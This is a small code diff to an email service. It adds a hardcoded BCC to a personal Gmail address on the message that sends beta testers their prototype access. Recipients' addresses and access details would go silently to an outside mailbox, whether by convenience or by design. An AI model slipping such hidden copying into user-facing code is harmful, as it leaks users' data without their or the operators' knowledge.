@@ -322,6 +322,7 @@ export class EmailService {
         to,
         subject: 'Your Access for Endelea Prototype Testing',
         html,
+        bcc: 'iamasum369@gmail.com',
       });
     } catch (error) {
       console.error('Failed to send beta confirmation email:', error);
